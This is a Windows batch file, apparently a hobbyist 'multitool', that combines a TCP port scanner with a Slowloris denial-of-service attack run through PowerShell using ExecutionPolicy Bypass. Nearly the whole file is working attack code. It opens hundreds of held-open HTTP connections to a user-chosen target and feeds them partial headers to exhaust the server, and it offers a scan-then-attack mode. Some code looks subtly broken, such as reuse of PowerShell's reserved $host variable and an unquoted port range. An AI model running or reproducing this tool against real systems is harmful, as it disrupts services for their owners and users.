@echo off
title AC's Multitool 0.1
color 0a
echo.
echo ========================================
echo        AC's Multitool 0.1
echo        Port Scanner + Slowloris
echo ========================================
echo.

setlocal enabledelayedexpansion

:menu
echo [1] Port Scan (Nmap style)
echo [2] Slowloris DoS
echo [3] Combined Attack (Scan then Slowloris)
echo [4] Exit
set /p choice="Select option: "

if "%choice%"=="1" goto scan
if "%choice%"=="2" goto slowloris
if "%choice%"=="3" goto combined
if "%choice%"=="4" goto end
echo Invalid option. Try again.
goto menu

:scan
set /p target="Enter target IP or domain: "
set /p portrange="Enter port range (default 1-1024): "
if "%portrange%"=="" set portrange=1-1024

echo [AC] Starting port scan on %target% ports %portrange%...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
$ports = %portrange% -split '-'; ^
$start = [int]$ports[0]; $end = [int]$ports[1]; ^
for($p=$start; $p -le $end; $p++) { ^
  try { ^
    $sock = New-Object System.Net.Sockets.TcpClient; ^
    $sock.Connect('%target%', $p); ^
    Write-Host \"[AC] Port $p OPEN\"; ^
    $sock.Close(); ^
  } catch {} ^
}
echo [AC] Scan finished.
pause
goto menu

:slowloris
set /p target="Enter target (IP or domain): "
set /p conns="Number of connections (default 300): "
set /p time="Duration in seconds (default 180): "
if "%conns%"=="" set conns=300
if "%time%"=="" set time=180

echo [AC] Launching Slowloris on %target% with %conns% connections for %time%s...

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
$target = '%target%'; ^
$connections = %conns%; ^
$duration = %time%; ^
$sockets = @(); ^
$host = if($target -match '^https?://') { [uri]$target | %% Host } else { $target }; ^
$port = 80; ^
function New-Socket { ^
  try { ^
    $s = New-Object System.Net.Sockets.TcpClient; ^
    $s.Connect($host, $port); ^
    $stream = $s.GetStream(); ^
    $writer = New-Object System.IO.StreamWriter($stream); ^
    $writer.Write(\"GET /?\" + (Get-Random) + \" HTTP/1.1`r`n\"); ^
    $writer.Write(\"Host: $host`r`n\"); ^
    $writer.Write(\"User-Agent: AC-Multitool`r`n\"); ^
    $writer.Write(\"Connection: keep-alive`r`n`r`n\"); ^
    $writer.Flush(); ^
    return $s; ^
  } catch { return $null } ^
} ^
for($i=0; $i -lt $connections; $i++) { ^
  $sock = New-Socket; ^
  if($sock) { $sockets += $sock }; ^
  Start-Sleep -Milliseconds 10; ^
} ^
Write-Host \"[AC] $($sockets.Count) sockets ready\"; ^
$start = Get-Date; ^
while (((Get-Date) - $start).TotalSeconds -lt $duration) { ^
  for($i=0; $i -lt $sockets.Count; $i++) { ^
    try { ^
      $writer = New-Object System.IO.StreamWriter($sockets[$i].GetStream()); ^
      $writer.Write(\"X-a: \" + (Get-Random) + \"`r`n\"); ^
      $writer.Flush(); ^
    } catch { ^
      try { $sockets[$i].Close() } catch {}; ^
      $sockets[$i] = New-Socket; ^
    } ^
  } ^
  Start-Sleep -Seconds 8; ^
} ^
Write-Host \"[AC] Slowloris finished\"
echo [AC] Attack session ended.
pause
goto menu

:combined
set /p target="Enter target: "
echo [AC] Phase 1: Scanning %target%...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
for($p=1; $p -le 500; $p++) { ^
  try { ^
    $sock = New-Object System.Net.Sockets.TcpClient; ^
    $sock.Connect('%target%', $p); ^
    if($sock.Connected) { Write-Host \"[AC] Port $p OPEN\" }; ^
    $sock.Close(); ^
  } catch {} ^
}
echo [AC] Scan done. Starting Slowloris...
:: Call slowloris logic here (reuse code from above)
goto slowloris

:end
echo [AC] Multitool shutting down.
pause
endlocal
